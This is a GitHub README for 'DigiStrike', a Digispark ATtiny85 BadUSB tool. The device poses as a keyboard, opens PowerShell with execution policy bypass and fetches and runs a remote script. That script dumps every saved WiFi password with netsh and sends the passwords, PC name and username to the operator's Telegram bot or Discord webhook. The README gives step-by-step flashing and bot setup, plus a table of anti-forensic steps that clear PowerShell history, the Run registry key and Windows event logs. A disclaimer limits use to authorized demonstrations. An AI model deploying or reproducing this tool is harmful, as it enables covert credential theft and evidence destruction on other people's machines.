<!--
  DigiStrike | Digispark ATtiny85 BadUSB WiFi Credential Exfiltrator
  Keywords: BadUSB, Digispark, ATtiny85, HID attack, WiFi credential dumper,
  cybersecurity, penetration testing, red team, Arduino, PowerShell payload,
  Discord webhook, Telegram bot, keyboard injection, USB attack.
-->

<div align="center">

# ⚡ DigiStrike

### Digispark ATtiny85 BadUSB | WiFi Credential Exfiltrator

[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Esther7171/DigiStrike)
[![Language](https://img.shields.io/badge/Language-Arduino%20%7C%20PowerShell-00979D?style=for-the-badge&logo=arduino&logoColor=white)](https://github.com/Esther7171/DigiStrike)
[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue?style=for-the-badge)](LICENSE)
[![Integration](https://img.shields.io/badge/Integration-Telegram%20%7C%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://github.com/Esther7171/DigiStrike)
[![Cost](https://img.shields.io/badge/Hardware-Under%20%E2%82%B9300-brightgreen?style=for-the-badge)](https://www.amazon.in/s?k=digispark+attiny85)

**Plug in. Done in 24 seconds. Zero traces.**

*Built for college exhibitions and cybersecurity awareness demonstrations.*

</div>

---

## What is DigiStrike

DigiStrike is a **BadUSB** tool built on the **Digispark ATtiny85** microcontroller. When plugged into a Windows machine it registers as a USB keyboard, silently opens PowerShell, pulls a payload script from GitHub, dumps every saved WiFi password on the machine and sends them to your Telegram or Discord instantly. Then it erases everything it touched.

No drivers. No admin prompt. No antivirus alert. The OS just sees someone typing.

---

## What it is Capable of

- Dumps all saved WiFi SSIDs and plaintext passwords via `netsh wlan`
- Sends credentials as a file (Telegram) or formatted message (Discord)
- Captures computer name, username and domain in the output
- Fully automated from plug-in to exit. No interaction needed
- Works on any Windows 10 / 11 machine regardless of who is logged in
- Repeatable. Plug into as many machines as you want, it runs every time

---

## Hardware

The Digispark ATtiny85 is a microcontroller board the size of a USB dongle. It costs under ₹300 and requires no soldering or assembly.

| Property | Value |
|----------|-------|
| Chip | Atmel ATtiny85 |
| Clock | 16.5 MHz |
| Flash | 8 KB (6 KB usable) |
| Connector | USB-A built in |
| OS Detection | HID Keyboard only. No USB storage |
| Cost | Under ₹300 (~$3 USD) |

**Where to buy:**

| Store | Link |
|-------|------|
| Amazon India | [Search on Amazon.in](https://www.amazon.in/s?k=digispark+attiny85) |
| AliExpress | [Search on AliExpress](https://www.aliexpress.com/w/wholesale-digispark-attiny85.html) |
| Robu.in | [Search on Robu.in](https://robu.in/?s=digispark+attiny85) |

Search for: `Digispark ATtiny85` or `Digispark Kickstarter USB`

> Buy the version with the **USB-A connector built directly onto the board**, not the micro USB variant.

---

## How it Works

From the moment it is plugged in:

```
1. Digispark registers as a HID keyboard (trusted immediately by Windows)
2. Sends Win+R to open the Run dialog
3. Types: powershell -ep bypass and hits Enter
4. Injects bot token or webhook URL as environment variables (keystrokes only)
5. Downloads the payload script from GitHub via iex + iwr
6. netsh wlan dumps all saved WiFi profiles and plaintext keys
7. Credentials sent to Telegram or Discord
8. Temp file deleted, PS history cleared, registry and event logs wiped
9. PowerShell exits
10. Nothing left on the machine
```

---

## Execution Time

| Phase | Action | Time |
|-------|--------|------|
| HID Stabilize | Windows enumerates the device | 3.0s |
| Win+R | Open Run dialog | 1.0s |
| PowerShell Open | Type command and wait for window | 4.0s |
| Credential Injection | Type token or webhook as env var | 0.4s |
| Payload | Download script, exfiltrate, clean | 15.0s |
| Exit | Close PowerShell | 0.5s |
| **Total** | | **~24s** |

Delays are set in the `.ino` file and can be increased for slow machines.

---

## Persistence

The payload is stored permanently in the ATtiny85 flash memory. Once flashed, the Digispark runs the attack every time it is plugged in, on any machine, with no re-flashing needed. There is no expiry and no battery required.

On the target machine, nothing persists. The script runs, exfiltrates and removes itself.

---

## How it Evades Forensic Analysis

| What gets cleaned | How |
|-------------------|-----|
| Temp file on disk | Created with a random name via `Get-Random`, deleted immediately after exfiltration with `Remove-Item -Force` |
| PowerShell session history | `Clear-History` wipes commands typed in the session |
| PSReadLine persistent buffer | `[PSConsoleReadLine]::ClearHistory()` clears the history file stored on disk |
| Win+R run dialog history | `RunMRU` registry key deleted via `Remove-ItemProperty` |
| Windows Event Logs | `wevtutil cl` clears System, Security and Application logs (Discord version) |
| USB storage artifacts | Digispark shows as HID keyboard only. Windows never logs it as a USB drive, so no USB forensic artifacts exist |
| Credentials on disk | Bot token and webhook URL are typed live as keystrokes into PowerShell. They exist only in RAM and are never written to a file |
| GitHub script contents | Neither `void.ps1` nor `null.ps1` contain any credentials. Safe to host publicly. |

**What a forensic team can still find:**

Outbound HTTPS traffic to Telegram or Discord is visible in router and ISP logs. The PowerShell prefetch file at `C:\Windows\Prefetch\` is not cleared. NTFS journal entries (MFT and UsnJrnl) record the file creation and deletion. For a full network-isolated lab environment, these are the only remaining indicators.

---

## Setup

### Requirements

- Arduino IDE 1.8.x, download from [arduino.cc/en/software](https://www.arduino.cc/en/software)
  - Use 1.8.x only. Version 2.x has upload timing issues with Digispark.
- A Digispark ATtiny85 board
- A Telegram bot or Discord webhook

### Install the Board Package

1. Open Arduino IDE → `File` → `Preferences`
2. Add this URL to *Additional Board Manager URLs*:
   ```
   http://digistump.com/package_digistump_index.json
   ```
3. Go to `Tools` → `Board` → `Board Manager`, search **Digistump AVR Boards**, click **Install**
4. Select the board:
   ```
   Tools → Board → Digistump AVR Boards → Digispark (Default - 16.5mhz)
   ```

### Flash the Board

1. Open the `.ino` file for your chosen integration in Arduino IDE
2. Replace the placeholder values (see Telegram or Discord sections below)
3. Click **Upload**
4. Wait for `Plug in device now...` to appear in the console
5. Only then plug in the Digispark
6. Wait for `>> Micronucleus done. Thank you!`

---

## Telegram Integration

### Step 1: Create a Bot

1. Open Telegram and search for `@BotFather` (verified account with blue tick)
2. Send `/start` then `/newbot`
3. Enter a display name when asked. Example: `Lab Bot`
4. Enter a username ending in `bot`. Example: `my_lab_r00t_bot`
   - Must be globally unique on Telegram
   - If taken, BotFather will ask you to pick another

BotFather replies with your **API token**:
```
1234567890:ABCDefghIJKLmnoPQRsTUVwxyz1234567890
```
Copy the full token including the numbers before the colon.

### Step 2: Get Your Chat ID

**Private chat:**
1. Search your bot username and send it any message (e.g. `hi`)
2. Open this URL in a browser (replace `YOUR_TOKEN`):
   ```
   https://api.telegram.org/botYOUR_TOKEN/getUpdates
   ```
3. In the JSON response, find:
   ```json
   "chat": { "id": 987654321 }
   ```
4. That number is your chat ID.

**Group chat:**
1. Create a group and add your bot as a member
2. Send any message in the group
3. Open the same `getUpdates` URL
4. Group chat IDs start with a minus sign: `-100987654321`
5. Copy the full number including the minus sign

### Step 3: Add to the Sketch

Open `digispark/telegram/r00t_b0t.ino`. Find these two lines:

```cpp
DigiKeyboard.print("$env:TK='PASTE_TOKEN_HERE'");
DigiKeyboard.print("$env:CI='PASTE_CHAT_ID_HERE'");
```

Replace:
- `PASTE_TOKEN_HERE` with your bot token
- `PASTE_CHAT_ID_HERE` with your chat ID

Flash the board. A `.txt` file with all WiFi credentials, PC name and username arrives in your Telegram in about 24 seconds.

---

## Discord Integration

### Step 1: Create a Webhook

1. Open Discord and go to your server
2. Right-click the channel you want alerts in and click **Edit Channel**
3. Click **Integrations** in the left sidebar
4. Click **Webhooks** → **New Webhook**
5. Give it a name. Example: `r00t_b0t`
6. Confirm the channel is correct in the dropdown
7. Click **Copy Webhook URL**

The URL looks like this:
```
https://discord.com/api/webhooks/1234567890123456789/LONG_TOKEN_HERE
```

Keep this URL private. Anyone with it can post to your channel.

8. Click **Save Changes**

### Step 2: Test the Webhook (optional)

Run this in PowerShell on your own machine to confirm the URL works:

```powershell
$wh = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
$body = ConvertTo-Json @{ content = "test" }
Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
```

If a message appears in Discord, the webhook is valid.

### Step 3: Add to the Sketch

Open `digispark/discord/r00t_b0t.ino`. Find this line:

```cpp
DigiKeyboard.print("$env:WH='PASTE_WEBHOOK_URL_HERE'");
```

Replace `PASTE_WEBHOOK_URL_HERE` with your full webhook URL. Flash the board.

A formatted message with WiFi credentials, PC name, username and domain arrives in your Discord channel in about 24 seconds:

```
[r00t_b0t] Incoming Data
================================
PC      : DESKTOP-XXXXXX
User    : username
Domain  : WORKGROUP
================================
WiFi Passwords
--------------------------------
Network  : HomeNetwork
Password : mypassword123
--------------------------------
```

---

## File Structure

```
DigiStrike/
├── README.md
├── LICENSE
├── digispark/
│   ├── telegram/
│   │   └── r00t_b0t.ino     Telegram version (flash to ATtiny85)
│   └── discord/
│       └── r00t_b0t.ino     Discord version (flash to ATtiny85)
└── scripts/
    ├── void.ps1             Telegram payload (host on GitHub)
    └── null.ps1             Discord payload (host on GitHub)
```

---

## Disclaimer

For educational use and authorized security demonstrations only.
Use on devices you own or have explicit written permission to test.
Unauthorized use violates the IT Act (India), CFAA (USA) and equivalent laws.
The author takes no responsibility for misuse.

---

## Author

**Esther7171**

[![GitHub](https://img.shields.io/badge/GitHub-Esther7171-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171)
[![DeathEsther](https://img.shields.io/badge/Project-DeathEsther-8B0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171/DeathEsther)

---

<div align="center">

If this helped you understand BadUSB attacks, drop a ⭐

</div>
